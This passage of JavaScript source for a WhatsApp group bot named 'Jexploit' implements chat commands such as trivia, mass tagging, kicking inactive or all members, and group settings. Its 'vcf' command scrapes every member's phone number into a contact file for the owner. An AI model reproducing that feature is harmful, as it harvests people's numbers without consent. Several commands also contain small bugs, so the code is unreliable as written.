        // Send the pickup line to the chat
        await conn.sendMessage(from, { text: pickupLine }, { quoted: m });

    } catch (error) {
        console.error("Error in pickupline command:", error);
        reply("Sorry, something went wrong while fetching the pickup line. Please try again later.");
    }
}
break
case "trivia": {
try {
      let res = await fetch("https://opentdb.com/api.php?amount=1");
      let json = await res.json();

      let question = json.results[0].question;
      let answer = json.results[0].correct_answer;

      await conn.sendMessage(m.chat, { text: `Question: ${question}\n\nThink you know the answer? Sending the correct answer after 20 seconds` }, { quoted: m });
      
      setTimeout(async () => {
        await conn.sendMessage(m.chat, { text: `Answer: ${answer}` });
      }, 20000); // 20 seconds
    } catch (error) {
      console.error('Error fetching trivia question:', error);
      reply('An error occurred while fetching the trivia question.');
    }
}
break
case "advice": {
    try {
        let res = await fetch("https://api.giftedtech.co.ke/api/fun/advice?apikey=gifted");
        if (!res.ok) {
            throw new Error(`API request failed with status ${res.status}`);
        }
        let json = await res.json();
        // Check if the response has the expected structure
        if (json && json.success && json.result) {
            await conn.sendMessage(m.chat, { text: `💡 Advice: ${json.result}` }, { quoted: m });
        } else {
            throw new Error('Invalid API response structure');
        }
    } catch (error) {
        console.error('Error fetching advice:', error);
        reply('Sorry, I couldn\'t fetch an advice at the moment. Please try again later.');
    }
}
break
case "motivate": {
    try {
        let res = await fetch("https://api.giftedtech.co.ke/api/fun/motivate?apikey=gifted");
        if (!res.ok) {
            throw new Error(`API request failed with status ${res.status}`);
        }
        let json = await res.json();
        // Check if the response has the expected structure
        if (json && json.success && json.result) {
            await conn.sendMessage(m.chat, { text: `💫 ${json.result}` }, { quoted: m });
        } else {
            throw new Error('Invalid API response structure');
        }
    } catch (error) {
        console.error('Error fetching motivation:', error);
        reply('Sorry, I couldn\'t fetch a motivational quote at the moment. Please try again later.');
    }
}
break
case "mee": {
const voiceClips = [
    "https://cdn.ironman.my.id/i/7p5plg.mp4",
    "https://cdn.ironman.my.id/i/rnptgd.mp4",
    "https://cdn.ironman.my.id/i/smsl2s.mp4",
    "https://cdn.ironman.my.id/i/vkvh1d.mp4",
    "https://cdn.ironman.my.id/i/9xp5lb.mp4",
    "https://cdn.ironman.my.id/i/jfr6cu.mp4",
    "https://cdn.ironman.my.id/i/l4dyvg.mp4",
    "https://cdn.ironman.my.id/i/4z93dg.mp4",
    "https://cdn.ironman.my.id/i/m9gwk0.mp4",
    "https://cdn.ironman.my.id/i/gr1jjc.mp4",
    "https://cdn.ironman.my.id/i/lbr8of.mp4",
    "https://cdn.ironman.my.id/i/0z95mz.mp4",
    "https://cdn.ironman.my.id/i/rldpwy.mp4",
    "https://cdn.ironman.my.id/i/lz2z87.mp4",
    "https://cdn.ironman.my.id/i/gg5jct.mp4"
  ];

  const randomClip = voiceClips[Math.floor(Math.random() * voiceClips.length)];
  const mentionedUser = m.sender;

  // 🧷 Mention user with text first
  await conn.sendMessage(m.chat, {
    text: `@${mentionedUser.split('@')[0]}`,
    mentions: [mentionedUser]
  });

  // 🎙️ Send Voice Note with Audio Type and Waveform + ExternalAdReply
  await conn.sendMessage(m.chat, {
    audio: { url: randomClip },
    mimetype: 'audio/mp4',
    ptt: true,
    waveform: [99, 0, 99, 0, 99],
    contextInfo: {
      forwardingScore: 55555,
      isForwarded: true,
      externalAdReply: {
        title: "Jexploit",
        body: "𝐓𝝰̚𝐠͜͡𝗲 𝝪𝐨̚𝝻͜͡𝐫 𝐋𝝾̚𝝼͜͡𝗲 :🦚🍬⛱️🎗️💖",
        mediaType: 4,
        thumbnailUrl: "https://files.catbox.moe/ptpl5c.jpeg",
        sourceUrl: "https://Wa.me/+254734939236",
        showAdAttribution: true
      }
    },
    mentions: [mentionedUser]
  });
}
break
case "character": {
try {
        // Ensure the command is used in a group
        if (!isGroup) {
            return reply("This command can only be used in groups.");
        }

        // Extract the mentioned user
        const mentionedUser = m.message.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
        if (!mentionedUser) {
            return reply("Please mention a user whose character you want to check.");
        }

        // Define character traits
        const userChar = [
            "Sigma",
            "Generous",
            "Grumpy",
            "Overconfident",
            "Obedient",
            "Good",
            "Simp",
            "Kind",
            "Patient",
            "Pervert",
            "Cool",
            "Helpful",
            "Brilliant",
            "Sexy",
            "Single",
            "Hot",
            "Gorgeous",
            "Cute",
        ];

        // Randomly select a character trait
        const userCharacterSelection =
            userChar[Math.floor(Math.random() * userChar.length)];

        // Message to send
        const message = `Character of @${mentionedUser.split("@")[0]} is *${userCharacterSelection}* 🔥⚡`;

        // Send the message with mentions
        await conn.sendMessage(from, {
            text: message,
            mentions: [mentionedUser],
        }, { quoted: m });

    } catch (e) {
        console.error("Error in character command:", e);
        reply("An error occurred while processing the command. Please try again.");
    }
}
//=====[GROUP MENU CMDS]======
break 
case "hidetag": case "h": {
if (!m.isGroup) return reply(mess.group)
if (!m.isAdmin) return reply(mess.notadmin);
    if (!m.isBotAdmin) return reply(mess.botadmin);

let members = groupMembers.map(a => a.id)
conn.sendMessage(m.chat, {text : q ? q : 'Jexploit Is Always Here', mentions: members}, {quoted:m})
}
break
case 'listactive':
case 'activeusers': {
    if (!m.isGroup) return reply(mess.group);
    
    // Get active users from SQLite
    const activeUsers = await getActiveUsers(conn, m.chat, 15); // Get top 15 active users
    
    if (!activeUsers.length) {
        return reply('*📊 No active users found in this group.*\n\nSend some messages first to track activity!');
    }
    
    let message = `📊 *ACTIVE USERS - ${groupName || 'This Group'}*\n\n`;
    
    activeUsers.forEach((user, index) => {
        const medal = index === 0 ? '🥇' : index === 1 ? '🥈' : index === 2 ? '🥉' : '🔹';
        message += `${medal} ${index + 1}. @${user.jid.split('@')[0]} - *${user.count} messages*\n`;
    });
    
    message += `\n📈 *Total tracked users:* ${activeUsers.length}`;
    
    await conn.sendMessage(m.chat, { 
        text: message, 
        mentions: activeUsers.map(u => u.jid) 
    }, { quoted: m });
    
}
break
case 'listinactive':
case 'inactiveusers': {
    if (!m.isGroup) return reply(mess.group);
    
    try {
        const metadata = await conn.groupMetadata(from);
        const allParticipants = metadata.participants.map(p => p.id);
        const inactiveUsers = getInactiveUsers(from, allParticipants);
        
        if (!inactiveUsers.length) {
            return reply('*✅ No inactive users found in this group!*\n\nAll participants have sent messages.');
        }
        
        let message = `⚠️ *INACTIVE USERS - ${groupName || 'This Group'}*\n\n`;
        message += `_Users who haven't sent any messages:_\n\n`;
        message += inactiveUsers.map((user, i) => `🔹 ${i + 1}. @${user.split('@')[0]}`).join('\n');
        message += `\n\n📊 *Total inactive:* ${inactiveUsers.length}`;

        await conn.sendMessage(m.chat, { 
            text: message, 
            mentions: inactiveUsers 
        }, { quoted: m });
        
    } catch (error) {
        console.error('Error in listinactive command:', error);
        await reply('❌ *Error fetching group data!*');
    }
    
}
break
case 'groupactivity':
case 'activity': {
    if (!m.isGroup) return reply(mess.group);
    
    try {
        const metadata = await conn.groupMetadata(from);
        const allParticipants = metadata.participants.map(p => p.id);
        const activeUsers = getActiveUsers(from, 1000); // Get all active users
        const inactiveUsers = getInactiveUsers(from, allParticipants);
        
        let message = `📊 *GROUP ACTIVITY - ${groupName || 'This Group'}*\n\n`;
        message += `*Total Members:* ${allParticipants.length}\n`;
        message += `✅ *Active Users:* ${activeUsers.length}\n`;
        message += `*Inactive Users:* ${inactiveUsers.length}\n\n`;
        
        if (activeUsers.length > 0) {
            message += `🏆 *Top 3 Active Users:*\n`;
            activeUsers.slice(0, 3).forEach((user, index) => {
                const medals = ['🥇', '🥈', '🥉'];
                message += `${medals[index]} @${user.jid.split('@')[0]} - *${user.count} messages*\n`;
            });
            message += `\n`;
        }
        
        if (inactiveUsers.length > 0) {
            message += `💤 *Inactive Users (${inactiveUsers.length}):*\n`;
            inactiveUsers.slice(0, 5).forEach((user, index) => {
                message += `${index + 1}. @${user.split('@')[0]}\n`;
            });
            if (inactiveUsers.length > 5) {
                message += `... and ${inactiveUsers.length - 5} more`;
            }
        }

        const mentions = [
            ...activeUsers.slice(0, 3).map(u => u.jid),
            ...inactiveUsers.slice(0, 5)
        ];
        
        await conn.sendMessage(m.chat, { 
            text: message, 
            mentions: mentions 
        }, { quoted: m });
        
    } catch (error) {
        console.error('Error in groupactivity command:', error);
        await reply('❌ *Error fetching group activity!*');
    }
    
}
break
case 'kickinactive':
case 'removeinactive': {
    if (!m.isGroup) return reply(mess.group);
    if (!m.isAdmin) return reply(mess.notadmin);
    if (!m.isBotAdmin) return reply(mess.botadmin);

    try {
        const metadata = await conn.groupMetadata(from);
        const allParticipants = metadata.participants.map(p => p.id);
        const groupAdmins = metadata.participants.filter(p => p.admin).map(p => p.id);
        
        const inactiveUsers = getInactiveUsers(from, allParticipants)
            .filter(user => !groupAdmins.includes(user)); // Exclude admins

        if (!inactiveUsers.length) {
            return reply('*✅ No inactive users found to kick!*\n\nAll participants have sent messages or are admins.');
        }

        let message = `🚨 *KICKING INACTIVE USERS - ${metadata.subject || 'This Group'}*\n\n`;
        message += `_The following users will be kicked in 25 seconds:_\n\n`;
        message += inactiveUsers.map((user, i) => `🔹 ${i + 1}. @${user.split('@')[0]}`).join('\n');
        message += `\n\n📊 *Total to kick:* ${inactiveUsers.length}`;
        message += `\n⏰ *Time:* 25 seconds`;
        message += `\n❌ *Cancel:* Use *${prefix}cancelkick* to stop`;

        await conn.sendMessage(m.chat, { 
            text: message, 
            mentions: inactiveUsers 
        }, { quoted: m });

        // Store in kick queue
        if (!global.kickQueue) global.kickQueue = new Map();
        global.kickQueue.set(m.chat, { 
            type: 'inactive', 
            users: inactiveUsers,
            timestamp: Date.now()
        });

        // Auto kick after 25 seconds
        setTimeout(async () => {
            if (!global.kickQueue.has(m.chat)) return;
            
            const queueData = global.kickQueue.get(m.chat);
            if (queueData.type === 'inactive') {
                for (let user of inactiveUsers) {
                    try {
                        await conn.groupParticipantsUpdate(m.chat, [user], "remove");
                        // Small delay to avoid rate limiting
                        await new Promise(resolve => setTimeout(resolve, 1000));
                    } catch (userError) {
                        console.error(`Failed to kick ${user}:`, userError);
                    }
                }
                reply('✅ *Inactive users have been kicked successfully!*');
                global.kickQueue.delete(m.chat);
            }
        }, 25000);

    } catch (error) {
        console.error('Error in kickinactive command:', error);
        await reply('❌ *Error processing kick command!*');
    }
    break;
}
case 'cancelkick': {
    if (!m.isGroup) return reply(mess.group);
    if (!m.isAdmin) return reply(mess.notadmin);
    if (!m.isBotAdmin) return reply(mess.botadmin);

    try {
        if (global.kickQueue && global.kickQueue.has(m.chat)) {
            const queueData = global.kickQueue.get(m.chat);
            const usersCount = queueData.users ? queueData.users.length : 0;
            const kickType = queueData.type === 'inactive' ? 'Inactive Users Kick' : 
                            queueData.type === 'all' ? 'Kick All Members' : 'Unknown Kick';
            
            global.kickQueue.delete(m.chat);
            
            let cancelMessage = `❌ *KICK OPERATION CANCELLED!*\n\n`;
            cancelMessage += `📋 *Type:* ${kickType}\n`;
            cancelMessage += `👥 *Users affected:* ${usersCount}\n`;
            cancelMessage += `⏰ *Cancelled by:* @${m.sender.split('@')[0]}\n`;
            cancelMessage += `✅ *Status:* Successfully cancelled`;
            
            await conn.sendMessage(m.chat, { 
                text: cancelMessage, 
                mentions: [m.sender]
            });
            
        } else {
            reply('❌ *No kick operation in progress!*\n\nThere is no active kick process to cancel.');
        }
    } catch (error) {
        console.error('Error in cancelkick command:', error);
        await reply('❌ *Error cancelling kick operation!*');
    }
    break;
}
case 'kickall':
case 'removeall': {
    if (!m.isGroup) return reply(mess.group);
    if (!m.isAdmin) return reply(mess.notadmin);
    if (!m.isBotAdmin) return reply(mess.botadmin);

    try {
        const metadata = await conn.groupMetadata(from);
        const allParticipants = metadata.participants.map(p => p.id);
        const groupAdmins = metadata.participants.filter(p => p.admin).map(p => p.id);
        
        // Get all non-admin members (users to kick)
        const usersToKick = allParticipants.filter(user => !groupAdmins.includes(user));

        if (!usersToKick.length) {
            return reply('*✅ No members to kick!*\n\nOnly admins are in this group.');
        }

        let message = `🚨 *KICKING ALL MEMBERS - ${metadata.subject || 'This Group'}*\n\n`;
        message += `_All non-admin members will be removed in 25 seconds:_\n\n`;
        message += usersToKick.map((user, i) => `🔹 ${i + 1}. @${user.split('@')[0]}`).join('\n');
        message += `\n\n📊 *Total to kick:* ${usersToKick.length}`;
        message += `\n*Admins protected:* ${groupAdmins.length}`;
        message += `\n*Time:* 25 seconds`;
        message += `\n*Cancel:* Use *${prefix}cancelkick* to stop`;

        await conn.sendMessage(m.chat, { 
            text: message, 
            mentions: usersToKick 
        }, { quoted: m });

        // Store in kick queue
        if (!global.kickQueue) global.kickQueue = new Map();
        global.kickQueue.set(m.chat, { 
            type: 'all', 
            users: usersToKick,
            timestamp: Date.now()
        });

        // Auto kick after 25 seconds
        setTimeout(async () => {
            if (!global.kickQueue.has(m.chat)) return;
            
            const queueData = global.kickQueue.get(m.chat);
            if (queueData.type === 'all') {
                let successCount = 0;
                let failCount = 0;
                
                for (let user of usersToKick) {
                    try {
                        await conn.groupParticipantsUpdate(m.chat, [user], "remove");
                        successCount++;
                        // Small delay to avoid rate limiting
                        await new Promise(resolve => setTimeout(resolve, 1000));
                    } catch (userError) {
                        console.error(`Failed to kick ${user}:`, userError);
                        failCount++;
                    }
                }
                
                let resultMessage = `✅ *Kick All Operation Completed!*\n\n`;
                resultMessage += `✓ Successfully kicked: ${successCount}\n`;
                if (failCount > 0) {
                    resultMessage += `✗ Failed to kick: ${failCount}\n`;
                }
                resultMessage += `🛡️ Admins remaining: ${groupAdmins.length}`;
                
                reply(resultMessage);
                global.kickQueue.delete(m.chat);
            }
        }, 25000);

    } catch (error) {
        console.error('Error in kickall command:', error);
        await reply('❌ *Error processing kick all command!*');
    }
    break;
}
case "tagall": {
    if (!m.isGroup) return reply(mess.group);
    if (!isAdmin) return reply(mess.notadmin);

    let me = m.sender;
    let q = m.text.split(' ').slice(1).join(' ').trim(); // Extract the message after the command
    let teks = `*TAGGED BY:* @${me.split("@")[0]}\n\n*MESSAGE:* ${q || "No message"}\n\n`;
    
    for (let mem of participants) {
        teks += `@${mem.id.split("@")[0]}\n`;
    }
    
    conn.sendMessage(
        m.chat,
        {
            text: teks,
            mentions: participants.map((a) => a.id),
        },
        {
            quoted: m,
        }
    );
}
break
case "togstatus": {
if (!isGroup) return reply(global.mess.notgroup);
            if (!m.isAdmin) return reply(mess.notadmin);
            if (!m.isBotAdmin) return reply(mess.botadmin);
        
        try {
            const messageText = m.message?.conversation || m.message?.extendedTextMessage?.text || '';
            const quotedMessage = m.message?.extendedTextMessage?.contextInfo?.quotedMessage;
            const commandRegex = /^[.!#/]?(togstatus|swgc|groupstatus|tosgroup)\s*/i;

            if (!quotedMessage && (!messageText.trim() || messageText.trim().match(commandRegex))) {
                return reply(getHelpText());
            }

            let payload = null;
            let textAfterCommand = '';

            if (messageText.trim()) {
                const match = messageText.match(commandRegex);
                if (match) textAfterCommand = messageText.slice(match[0].length).trim();
            }

            if (quotedMessage) {
                payload = await buildPayloadFromQuoted(quotedMessage, kelvin);
                if (textAfterCommand && payload) {
                    if (payload.video || payload.image || (payload.convertedSticker && payload.image)) {
                        payload.caption = textAfterCommand;
                    }
                }
            } else if (messageText.trim()) {
                if (textAfterCommand) {
                    payload = { text: textAfterCommand };
                } else {
                    return reply(getHelpText());
                }
            }

            if (!payload) {
                return reply(getHelpText());
            }

            // Send group status
            await sendGroupStatus(kelvin, m.chat, payload);

            const mediaType = detectMediaType(quotedMessage, payload);
            let successMsg = `✅ ${mediaType} sent!`;
            if (payload.caption) successMsg += `\n📝 "${payload.caption}"`;
            if (payload.convertedSticker) successMsg += `\n(sticker → image)`;

            await reply(successMsg);

        } catch (error) {
            console.error('Error in group status command:', error);
            await reply(`Error: ${error.message}`);
        }
}
break
case "mute":
case "close": {
    if (!m.isGroup) return reply(mess.group);
    if (!m.isAdmin) return reply(mess.notadmin);
    if (!m.isBotAdmin) return reply(mess.botadmin);
    
    try {
        await conn.groupSettingUpdate(m.chat, "announcement");
        reply("🔒 *Group closed successfully!*\n\nOnly admins can send messages now.");
    } catch (error) {
        console.error("Error muting group:", error);
        reply("❌ Failed to close the group. Make sure bot has admin permissions.");
    }
}
break;
case "delgrouppp": {
        if (!m.isGroup) return reply(mess.group);
        if (!m.isAdmin) return reply(mess.notadmin);
        if (!m.isBotAdmin) return reply(mess.botadmin);
        
        await conn.removeProfilePicture(from);
        reply("Group profile picture has been successfully removed.");
}
break
case "setdesc": {
        if (!m.isGroup) return reply(mess.group);
        if (!m.isAdmin) return reply(mess.notadmin);
    if (!m.isBotAdmin) return reply(mess.botadmin);
        
        if (!text) return reply("*Please enter a text*");
        
        await conn.groupUpdateDescription(m.chat, text);
        reply(mess.done);
}
break
case "vcf": {
try {
        if (!isGroup) return reply("This command is for groups only.");
        if (!Access) return reply("*_This command is for the owner only_*");

        let card = quoted || m; // Handle if quoted message exists
        let cmiggc = groupMetadata;
        const { participants } = groupMetadata;
        
        let orgiggc = participants.map(a => a.id);
        let vcard = '';
        let noPort = 0;
        
        for (let a of cmiggc.participants) {
            vcard += `BEGIN:VCARD\nVERSION:3.0\nFN:[${noPort++}] +${a.id.split("@")[0]}\nTEL;type=CELL;type=VOICE;waid=${a.id.split("@")[0]}:+${a.id.split("@")[0]}\nEND:VCARD\n`;
        }

        let nmfilect = './contacts.vcf';
        reply('Saving ' + cmiggc.participants.length + ' participants contact');

        fs.writeFileSync(nmfilect, vcard.trim());
        await sleep(2000);

        await conn.sendMessage(from, {
            document: fs.readFileSync(nmfilect), 
            mimetype: 'text/vcard', 
            fileName: 'jexploit.vcf', 
            caption: `\nDone saving.\nGroup Name: *${cmiggc.subject}*\nContacts: *${cmiggc.participants.length}*\n> Powered by ${global.botname} `}, { quoted: mek });

        fs.unlinkSync(nmfilect); // Cleanup the file after sending
    } catch (err) {
        reply(err.toString());
    }
}
break
case 'approve': {
if (!m.isGroup) return reply(mess.group)
if (!m.isAdmin) return reply(mess.notadmin);
    if (!m.isBotAdmin) return reply(mess.botadmin);

const responseList = await conn.groupRequestParticipantsList(m.chat);

if (responseList.length === 0) return reply("*No pending requests detected at the moment!*");

for (const participan of responseList) {
    const response = await conn.groupRequestParticipantsUpdate(
        m.chat, 
        [participan.jid], // Approve/reject each participant individually
        "approve" // or "reject"
    );
    console.log(response);
}
reply(`*${global.botname} has approved all pending requests✅*`);

}
break
case "approveall": {
if (!m.isGroup) return reply(mess.group);
    if (!m.isAdmin) return reply(mess.notadmin);
    if (!m.isBotAdmin) return reply(mess.botadmin);
    
     const groupId = m.chat;
 
     await approveAllRequests(m, groupId);
}
break
case " disapproveall": {
    if (!m.isGroup) return reply(mess.group);
    if (!m.isAdmin) return reply(mess.notadmin);
    if (!m.isBotAdmin) return reply(mess.botadmin);
        
    const groupId = m.chat;
 
   await disapproveAllRequests(m, groupId);
}
break
case "listrequest": {
if (!m.isGroup) return reply(mess.group);
        if (!m.isAdmin) return reply(mess.notadmin);
        if (!m.isBotAdmin) return reply(mess.botadmin);
        
    const groupId = m.chat; 

    await listGroupRequests(m, groupId);
}
break
case "mediatag": {
        if (!m.isGroup) return reply(mess.group);
  
        if (!m.isAdmin) return reply(mess.notadmin);
        if (!m.isBotAdmin) return reply(mess.botadmin);
        
        if (!m.quoted) return reply(`Reply to any media with caption ${prefix + command}`);

        conn.sendMessage(m.chat, {
          forward: m.quoted.fakeObj,
          mentions: participants.map((a) => a.id),
        });
}
break
case "promote":
case "upgrade": {
if (!Access) return reply(mess.owner);
        if (!m.isGroup) return reply(mess.group);
        if (!m.isAdmin) return reply(mess.notadmin);
        if (!m.isBotAdmin) return reply(mess.botadmin);
       
    let target = m.mentionedJid[0] 
      ? m.mentionedJid[0] 
      : m.quoted 
      ? m.quoted.sender 
      : text.replace(/\D/g, "") 
      ? text.replace(/\D/g, "") + "@s.whatsapp.net" 
      : null;

    if (!target) return reply("⚠ *Mention or reply to a user to promote!*");

    try {
      await conn.groupParticipantsUpdate(m.chat, [target], "promote");
      reply(`✅ *User promoted successfully!*`);
    } catch (error) {
      reply("❌ *Failed to promote user. They might already be an admin or the bot lacks permissions.*");
    }
  }
break
case "demote":
case "downgrade": {
        if (!m.isGroup) return reply(mess.group);
        if (!m.isAdmin) return reply(mess.notadmin);
        if (!m.isBotAdmin) return reply(mess.botadmin);
    
    let target = m.mentionedJid[0] 
      ? m.mentionedJid[0] 
      : m.quoted 
      ? m.quoted.sender 
      : text.replace(/\D/g, "") 
      ? text.replace(/\D/g, "") + "@s.whatsapp.net" 
      : null;

    if (!target) return reply("⚠ *Mention or reply to a user to demote!*");

    try {
      await conn.groupParticipantsUpdate(m.chat, [target], "demote");
      reply(`✅ *User demoted successfully!*`);
    } catch (error) {
      reply("❌ *Failed to demote user. They might already be a member or the bot lacks permissions.*");
    }
}
break
case " getgrouppp": {
if (!m.isGroup) return reply(mess.group);

    try {
      const ppUrl = await conn.profilePictureUrl(m.chat, 'image');

      await conn.sendMessage(m.chat, 
        { 
          image: { url: ppUrl }, 
          caption: `🔹 *This Group's Profile Picture*`
        }, 
        { quoted: m }
      );
    } catch {
      await conn.sendMessage(m.chat, 
        { 
          image: { url: 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60' }, 
          caption: '⚠️ No profile picture found for this group.'
        }, 
        { quoted: m }
      );
    }
}

break
case "online":
case "listonline": {
    if (!m.isGroup) return reply(mess.group);
    
    try {
        let id = args[0] && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat;
        
        // Safely check if presences exist
        let presences = store.presences && store.presences[id] ? store.presences[id] : null;
        
        if (!presences || Object.keys(presences).length === 0) {
            return reply('*No online members detected in this group.*');
        }

        // Safely get online members
        let onlineMembers = [];
        try {
            onlineMembers = [...Object.keys(presences), botNumber];
        } catch (e) {
            console.error('Error getting online members:', e);
            return reply('*Error detecting online members.*');
        }

        // Filter out invalid entries and ensure they're valid JIDs
        const validOnlineMembers = onlineMembers.filter(member => 
            member && typeof member === 'string' && member.includes('@')
        );

        if (validOnlineMembers.length === 0) {
            return reply('*No online members detected in this group.*');
        }

        let liston = 1;
        const onlineListText = '*ONLINE MEMBERS IN THIS GROUP*\n\n' + 
            validOnlineMembers.map(v => {
                const username = v.replace(/@.+/, '');
                return `${liston++}. @${username}`;
            }).join('\n');

        // Send message with mentions
        await conn.sendMessage(
            m.chat,
            {
                text: onlineListText,
                mentions: validOnlineMembers
            },
            { quoted: m }
        );
        
    } catch (error) {
        console.error('Error in listonline command:', error);
        reply('*An error occurred while checking online members.*');
    }
    
}
break
case "editinfo": {
       if (!m.isGroup) return reply(mess.group);

        if (!m.isAdmin) return reply(mess.notadmin);
        if (!m.isBotAdmin) return reply(mess.botadmin);

        if (args[0] === "on") {
            await conn.groupSettingUpdate(m.chat, "unlocked").then(
                (res) => reply(`*Successful, members can edit group info*`)
            );
        } else if (args[0] === "off") {
            await conn.groupSettingUpdate(m.chat, "locked").then((res) =>
                reply(`*Successful, members cannot edit group info*`)
            );
        } else {
            reply(`Example ${prefix + command} on/off`);
        }
}
break
case "invite": {
        if (!m.isGroup) return reply(mess.group);
 
        if (!m.isAdmin) return reply(mess.notadmin);
        if (!m.isBotAdmin) return reply(mess.botadmin);
       
        if (!text)
            return reply(
                `*Enter the number you want to invite to this group*\n\nExample :\n${prefix + command} 256742932677`
            );
        if (text.includes("+"))
            return reply(`*Enter the number together without* *+*`);
        if (isNaN(text))
            return reply(
                `*Enter only the numbers with your country code without spaces*`
            );

        let group = m.chat;
        let link = "https://chat.whatsapp.com/" + (await conn.groupInviteCode(group));
        await conn.sendMessage(text + "@s.whatsapp.net", {
            text: `*GROUP INVITATION*\n\nSomeone invites you to join this group: \n\n${link}`,
            mentions: [m.sender],
        });
        reply(`*Successfully sent invite link*`);
}
break
case "linkgc": {
if (!Access) return reply(mess.owner);
        if (!m.isGroup) return reply(mess.group);

    let response = await conn.groupInviteCode(m.chat);
    conn.sendText(
      m.chat,
      `*GROUP LINK*\n\n*NAME:* ${groupMetadata.subject}\n\n*OWNER:* ${groupMetadata.owner !== undefined ? "+" + groupMetadata.owner.split`@`[0] : "Unknown"}\n\n*ID:* ${groupMetadata.id}\n\n*LINK:* https://chat.whatsapp.com/${response}\n\n*MEMBERS:* ${groupMetadata.participants.length}`,
      m,
      {
        detectLink: true,
      }
    );
}
break
case "'unlockgc'": {
try {
        if (!isGroup) return reply(mess.group);
        if (!m.isAdmin) return reply(mess.notadmin);
        if (!m.isBotAdmin) return reply(mess.botadmin);
        
        await conn.groupSettingUpdate(from, "unlocked");
        reply("🔓 Group settings are now unlocked", {
            contextInfo: {
                forwardingScore: 999,
                isForwarded: true
            }
        });

    } catch (error) {
        console.error("UnlockGS Error:", error);
        reply("❌ Failed to unlock group settings");
    }
}
break
case "lockgcsettings":
case "lockgc": {
try {
        if (!isGroup) return reply(mess.group);
        if (!m.isAdmin) return reply(mess.notadmin);
        if (!m.isBotAdmin) return reply(mess.botadmin);
        await conn.groupSettingUpdate(from, 'locked');
        reply("🔒 Group settings are now locked (admins only)", {
            contextInfo: {
                forwardingScore: 999,
                isForwarded: true
            }
        });

    } catch (error) {
        console.error("LockGS Error:", error);
        reply("❌ Failed to lock group settings");
    }
}
break
case "unlockgcsettings":
case "unlockgc": {
    try {
       if (!m.isGroup) return reply(mess.group);
        if (!m.isAdmin) return reply(mess.notadmin);
        if (!m.isBotAdmin) return reply(mess.botadmin);
        await conn.groupSettingUpdate(from, 'unlocked');
        reply("🔓 Group settings are now unlocked (all participants)", {
            contextInfo: {
                forwardingScore: 999,
                isForwarded: true
            }
        });

    } catch (error) {
        console.error("UnlockGS Error:", error);
        reply("❌ Failed to unlock group settings");
    }
}
break
case "adminapproval": {
    try {
       if (!m.isGroup) return reply(mess.group);
        if (!m.isAdmin) return reply(mess.notadmin);
        if (!m.isBotAdmin) return reply(mess.botadmin);
        // Get current group settings to check current state
        const groupMetadata = await conn.groupMetadata(from);
        
        // Toggle admin approval mode
        await conn.groupSettingUpdate(from, groupMetadata.announce ? 'not_announcement' : 'announcement');
        
        const newState = groupMetadata.announce ? "OFF" : "ON";
        reply(`✅ Admin approval mode turned ${newState}`, {
            contextInfo: {
                forwardingScore: 999,
                isForwarded: true
            }
        });

    } catch (error) {
        console.error("AdminApproval Error:", error);
        reply("❌ Failed to toggle admin approval mode");
    }
}
break
case "closetime": {
    if (!m.isGroup) return reply(mess.group);
    if (!m.isAdmin) return reply(mess.notadmin);
    if (!m.isBotAdmin) return reply(mess.botadmin);
    

    // Check if both arguments are provided
    if (!args[0] || !args[1]) {
        return reply("*Usage:*\n.closetime [duration] [unit]\n\n*Select unit:*\nseconds\nminutes\nhours\ndays\n\n*Example:*\n10 seconds");
    }

    const duration = args[0];
    const unit = args[1].toLowerCase();

    let timer;
    switch (unit) {
        case "seconds":
            timer = duration * 1000;
            break;
        case "minutes":
            timer = duration * 60000;
            break;
        case "hours":
            timer = duration * 3600000;
            break;
        case "days":
            timer = duration * 86400000;
            break;
        default:
            return reply("*Select unit:*\nseconds\nminutes\nhours\ndays\n\n*Example:*\n10 seconds");
    }

    reply(`*Closing group after ${duration} ${unit}*`);
    setTimeout(() => {
        conn.groupSettingUpdate(m.chat, "announcement");
        reply("*Group closed by admin. Only admins can send messages.*");
    }, timer);
}
break
case "opentime": {
        if (!m.isGroup) return reply(mess.group);
        if (!m.isAdmin) return reply(mess.notadmin);
        if (!m.isBotAdmin) return reply(mess.botadmin);

    const duration = args[0];
    if (!args[1] || typeof args[1] !== 'string') return reply("*Select unit:*\nseconds\nminutes\nhours\ndays\n\n*Example:*\n10 seconds");
    const unit = args[1].toLowerCase();

    let timer;
    switch (unit) {
        case "seconds":
            timer = duration * 1000;
            break;
        case "minutes":
            timer = duration * 60000;
            break;
        case "hours":
            timer = duration * 3600000;
            break;
        case "days":
            timer = duration * 86400000;
            break;
        default:
            return reply("*Select unit:*\nseconds\nminutes\nhours\ndays\n\n*Example:*\n10 seconds");
    }

    reply(`*Opening group after ${duration} ${unit}*`);
    setTimeout(() => {
        conn.groupSettingUpdate(m.chat, "not_announcement");
        reply("*Group opened by admin. Members can now send messages.*");
    }, timer);
}
break
case "totalmembers": {
if (!m.isGroup) return reply(mess.group);
   
    await conn.sendMessage(
      m.chat,
      {
        text: `*GROUP*: ${groupMetadata.subject}\n*MEMBERS*: ${participants.length}`,
      },
      { quoted: m, ephemeralExpiration: 86400 }
    );
}
break
case "mediatag": {
        if (!m.isGroup) return reply(mess.group);
        if (!m.isAdmin) return reply(mess.notadmin);
        if (!m.isBotAdmin) return reply(mess.botadmin);
        if (!m.quoted) return reply(`Reply to any media with caption ${prefix + command}`);

        conn.sendMessage(m.chat, {
          forward: m.quoted.fakeObj,
          mentions: participants.map((a) => a.id),
        });
}
break
case "poll": {
if (!Access) return reply(mess.owner);
        if (!m.isGroup) return reply(mess.group);
        let [poll, opt] = text.split("|");
        if (text.split("|") < 2)
            return await reply(
                `Enter a question and at least 2 options\nExample: ${prefix}poll Who is best player?|Messi,Ronaldo,None...`
            );
        let options = [];
        for (let i of opt.split(",")) {
            options.push(i);
        }
        
        await conn.sendMessage(m.chat, {
            poll: {
                name: poll,
                values: options,
            },
        });
}
break
case 'antilink': {
    if (!m.isGroup) return reply(mess.group);
    if (!m.isAdmin && !Access) return reply(mess.notadmin);
    if (!m.isBotAdmin) return reply(mess.botadmin);
    
    const mode = args[0]?.toLowerCase();
    
    if (!mode) {
        const status = await db.getGroupSetting(botNumber, m.chat, 'antilink', false);
        const currentMode = await db.getGroupSetting(botNumber, m.chat, 'antilinkmode', 'delete');
